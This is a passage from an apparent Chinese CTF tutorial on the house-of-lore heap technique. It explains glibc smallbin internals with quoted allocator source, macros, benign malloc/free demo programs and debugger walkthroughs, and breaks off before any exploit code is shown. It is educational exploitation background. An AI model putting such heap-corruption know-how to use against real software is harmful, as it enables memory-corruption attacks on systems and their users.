class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// in_smallbin_range可以看出free的堆块size在什么范围内会被放入smallbin中</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// smallbin_index这个宏定义可以看出每个相邻idx的堆块存储chunk的size大小相差多少</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br></pre></td></tr></table></figure><ul><li><code>smallbin</code>这个堆块结构也是一个<strong>先进先出</strong>的堆块结构，（堆块被释放后放入smallbin的过程与fastbin放入机制相同，都是使用头插法），只不过<code>smallbin</code>是双向链表。接下来给出一个<code>smallbin</code>大致的结构图，这样更有利于我们了解（以64位系统为例子），注意<code>smallbin</code>和<code>largebin</code>中是这样的</li><li>而<code>smallbin</code>这个堆块的取出与<code>fastbin</code>堆块取出机制不同，fastbin取出的是最靠近bins的堆块。而<code>smallbin</code>是先取出的是<code>最远离bins</code>的堆块，即如果要使用smallbin的堆块时先取出的是<code>chunk0</code></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222202232637.png" alt="image-20250222202232637"></p><ul><li><p>被释放的堆块被放入<code>smallbin</code>的条件：</p><ul><li>首先被释放的堆块要符合<code>smallbin</code>堆块大小的范围：</li><li>接下来分析一下代码得出如下结论：当我们释放一个堆块，这个堆块被放入<code>unsortedbin</code>后，我们之后再申请一个堆块，这个堆块的申请如果既没有使用<code>unsortedbin</code>中的堆块，也没有使用<code>smallbin</code>中的堆块，这样先前被放入<code>unsortedbin</code>中的堆块就会被放入<code>smallbin</code></li><li>当<code>smallbin</code>中的堆块被切割后，切割后的堆块会先放入<code>unsortedbin</code>中（因为size位改变，现在的chunk中的size并不在当前<code>smallbin</code>范围中），之后我们再使用<code>malloc</code>申请一个堆块，并且申请的堆块没有使得<code>unsortedbin</code>中的堆块被切割，那么在<code>unsortedbin</code>中的堆块就会被放入<code>smallbin</code>中的堆块</li></ul></li><li><p>接下来我们给出一个示例程序：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> *p1,*p2,*p3,*p4,*p5;</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x210</span>); <span class="comment">// 申请一个比较大的堆块，这个堆块释放后会先被放入unsoertedbin中</span></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);  <span class="comment">// 再申请一个小堆块，这个堆块防止p1所指向的堆块释放后与top_chunk合并</span></span><br><span class="line">    <span class="built_in">free</span>(p1); <span class="comment">// 释放p1指向的堆块,这样就可以使得该堆块放入unsortedibin</span></span><br><span class="line">    p3 = <span class="built_in">malloc</span>(<span class="number">0x300</span>); <span class="comment">// 之后我们申请一个更大的堆块，使得该堆块不能从放入unsortedbin 中的堆块切割，在malloc过程中既然没有切割，那么在unsortedbin中的堆块就会被放入smallbin</span></span><br><span class="line">    p4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);  <span class="comment">// 申请一个0x10的堆块，这时就会从smallbin中切割一个堆块，并且将切割后的堆块重新放入unsortedbin中</span></span><br><span class="line">    p5 = <span class="built_in">malloc</span>(<span class="number">0x400</span>); <span class="comment">// 再申请一个大堆块，这样unsortedbin中的堆块又会被放入smallbin 中</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -o test test.c</span></span><br></pre></td></tr></table></figure><ul><li>接下来我们使用gdb动态调试查看一下堆块的运行机制。我们先申请一个<code>p1</code>堆块和<code>p2</code>堆块。</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222122624890.png" alt="image-20250222122624890"></p><ul><li>然后将<code>p1</code>堆块释放，该堆块就会被放入<code>unsortedbin</code>中</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222122701715.png" alt="image-20250222122701715"></p><ul><li>然后我们再申请一个<code>p3</code>堆块，这样<code>p1</code>堆块就会被放入<code>smallbin[idx1]</code>中管理</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222122743374.png" alt="image-20250222122743374"></p><ul><li>然后我们再申请一个<code>p4</code>堆块，这样原来的<code>p1</code>堆块就会被切割，并放入<code>unsortebin</code>中</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222122835685.png" alt="image-20250222122835685"></p><ul><li>之后申请一个<code>p5</code>的堆块，这样<code>p1</code>堆块就会又被放入<code>smallbin[idx2]</code>中管理，其中<code>idx2 &lt; idx1</code></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222123013521.png" alt="image-20250222123013521"></p><ul><li>此外还可以进行这样的动态调试去查看<code>smallbins</code>是的双向链表机制</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> *p1,*p2,*p3,*p4;</span><br><span class="line">        p1 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        p2 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        p3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">free</span>(p2);</span><br><span class="line">        p4 = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="相关代码"><a href="#相关代码" class="headerlink" title="相关代码"></a>相关代码</h2><ul><li>接下来给出<code>glibc2.23</code>中的<code>smallbin</code>的相关源码。</li><li>下面是<code>malloc</code>中关于smallbin的代码</li></ul><details>    <summayr>_int_malloc相关源码</summayr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">               &#125;</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">            If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">            only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">            runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">            exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">            no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">             bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">             victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">             (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             remainder = chunk_at_offset (victim, nb);</span><br><span class="line">             unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">             av-&gt;last_remainder = remainder;</span><br><span class="line">             remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">             <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">               &#123;</span><br><span class="line">                 remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">             set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">             set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">             set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = smallbin_index (size);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">         <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">             (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">           &#123;</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line">             <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                     (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">               victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                list does not have to be rerouted.  */</span></span><br><span class="line">             <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">               victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Exhaust */</span></span><br><span class="line">             <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">               &#123;</span><br><span class="line">                 set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                 <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                   victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="comment">/* Split */</span></span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                 <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                    have to perform a complete insert here.  */</span></span><br><span class="line">                 bck = unsorted_chunks (av);</span><br><span class="line">                 fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                   &#123;</span><br><span class="line">                     errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                     <span class="keyword">goto</span> errout;</span><br><span class="line">                   &#125;</span><br><span class="line">                 remainder-&gt;bk = bck;</span><br><span class="line">                 remainder-&gt;fd = fwd;</span><br><span class="line">                 bck-&gt;fd = remainder;</span><br><span class="line">                 fwd-&gt;bk = remainder;</span><br><span class="line">                 <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                   &#123;</span><br><span class="line">                     remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                     remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                 set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                 set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                 set_foot (remainder, remainder_size);</span><br><span class="line">               &#125;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></details><ul><li>下面是<code>_int_free</code>中的smallbin相关操作</li></ul><details>    <summary>_int_free中的源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">     bck = unsorted_chunks(av);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">     p-&gt;fd = fwd;</span><br><span class="line">     p-&gt;bk = bck;</span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p;</span><br><span class="line">     fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">     set_foot(p, size);</span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></details><details>    <summary>相关宏定义</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// min_large_size存储在largebin的最小值,也就是smallbin存储堆块size的最大范围</span></span><br><span class="line"><span class="comment">// NSMALLBINS在下方有宏定义,定义的值为64</span></span><br><span class="line"><span class="comment">// SMALLBIN_WIDTH也是一个宏定义,定义的值为MALLOC_ALIGNMENT,而MALLOC_ALIGNMENT也是一个宏定义其具体值为2 *SIZE_SZ</span></span><br><span class="line"><span class="comment">// 32位系统2 *SIZE_SZ=8字节,64位系统2 *SIZE_SZ=16字节</span></span><br><span class="line"><span class="comment">// SMALLBIN_CORRECTION也是一个宏定义,其值不是1就是0,一般情况下都为0</span></span><br><span class="line"><span class="comment">// 所以在32位系统MIN_LARGE_SIZE = 64 * 8 = 512字节</span></span><br><span class="line"><span class="comment">// 所以在64位系统MIN_LARGE_SIZE = 64 * 16 = 1024字节</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// in_smallbin_range可以看出free的堆块size在什么范围内会被放入smallbin中</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// smallbin_index这个宏定义可以看出每个相邻idx的堆块存储chunk的size大小相差多少      </span></span><br><span class="line"><span class="comment">// SMALLBIN_WIDTH的值在32位为8，在64位系统为16,如果SMALLBIN_WIDTH为真则返回sz&gt;&gt;4   </span></span><br><span class="line"><span class="comment">// 如果SMALLBIN_WIDTH为假则返回 sz &gt;&gt; 3 +  SMALLBIN_CORRECTION(这个值一般为0)</span></span><br><span class="line"><span class="comment">// 也就是说在64位系统中相邻index的堆块size相差0x10字节,在32位系统中相邻index的堆块size相差0x8字节</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure></details><ul><li>在<code>glibc2.27</code>中添加了一个检查机制</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br></pre></td></tr></table></figure><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><details>    <summary>源码</summary>​    <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span 